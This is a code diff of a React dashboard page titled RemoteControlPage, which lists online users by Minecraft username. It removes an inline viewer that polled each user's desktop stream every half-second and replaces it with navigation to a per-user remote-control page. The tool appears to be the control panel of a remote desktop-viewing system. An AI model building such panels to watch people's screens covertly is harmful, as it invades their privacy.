@@ -31,8 +31,6 @@ function NavItem({ icon, label, active, onClick }) {
 export default function RemoteControlPage() {
   const router = useRouter();
   const [onlineUsers, setOnlineUsers] = useState([]);
-  const [viewingStream, setViewingStream] = useState(null);
-  const [streamFrame, setStreamFrame] = useState(null);
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
@@ -46,17 +44,6 @@ export default function RemoteControlPage() {
     }, 3000);
     return () => clearInterval(iv);
   }, []);
-
-  useEffect(() => {
-    if (!viewingStream) { setStreamFrame(null); return; }
-    const iv = setInterval(() => {
-      fetch('/api/stream?username=' + encodeURIComponent(viewingStream))
-        .then(r => r.json())
-        .then(d => { if (d.frame) setStreamFrame(d.frame); else { setViewingStream(null); setStreamFrame(null); } })
-        .catch(() => {});
-    }, 500);
-    return () => clearInterval(iv);
-  }, [viewingStream]);
 
   return (
     <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
@@ -96,7 +83,10 @@ export default function RemoteControlPage() {
         ) : (
           <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap', marginBottom: 20 }}>
             {onlineUsers.map(u => (
-              <div key={u.username} onClick={() => setViewingStream(viewingStream === u.username ? null : u.username)} className="glass-card" style={{ cursor: 'pointer', border: '1px solid ' + (viewingStream === u.username ? colors.green : 'rgba(255,255,255,0.06)'), borderRadius: 10, padding: '12px 16px', display: 'flex', alignItems: 'center', gap: 10 }}>
+              <div key={u.username} onClick={() => router.push('/dashboard/remote-control/' + encodeURIComponent(u.username))} className="glass-card" style={{ cursor: 'pointer', border: '1px solid ' + colors.border, borderRadius: 10, padding: '12px 16px', display: 'flex', alignItems: 'center', gap: 10 }}
+                onMouseEnter={e => { e.currentTarget.style.borderColor = colors.green; e.currentTarget.style.background = 'rgba(34, 197, 94, 0.04)'; }}
+                onMouseLeave={e => { e.currentTarget.style.borderColor = colors.border; e.currentTarget.style.background = 'transparent'; }}
+              >
                 <img src={'https://mc-heads.net/avatar/' + u.username + '/32'} alt="" style={{ width: 28, height: 28, borderRadius: 6 }} />
                 <div>
                   <div style={{ fontSize: 13, fontWeight: 600, color: colors.text }}>{u.username}</div>
@@ -104,24 +94,6 @@ export default function RemoteControlPage() {
                 </div>
               </div>
             ))}
-          </div>
-        )}
-
-        {viewingStream && (
-          <div className="glass-card" style={{ border: '1px solid ' + colors.green, borderRadius: 12, padding: 16 }}>
-            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12 }}>
-              <div style={{ fontSize: 14, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 8 }}>
-                <img src={'https://mc-heads.net/avatar/' + viewingStream + '/24'} alt="" style={{ width: 24, height: 24, borderRadius: 4 }} />
-                {viewingStream}&apos;s Desktop
-                <span style={{ color: colors.green, fontSize: 11 }}>STREAMING</span>
-              </div>
-              <div onClick={() => { setViewingStream(null); setStreamFrame(null); }} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 13 }}>Close</div>
-            </div>
-            {streamFrame ? (
-              <img src={streamFrame} alt="Desktop stream" style={{ width: '100%', borderRadius: 8, border: '1px solid ' + colors.border }} />
-            ) : (
-              <div style={{ height: 300, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim, fontSize: 13 }}>Connecting...</div>
-            )}
           </div>
         )}
       </main>
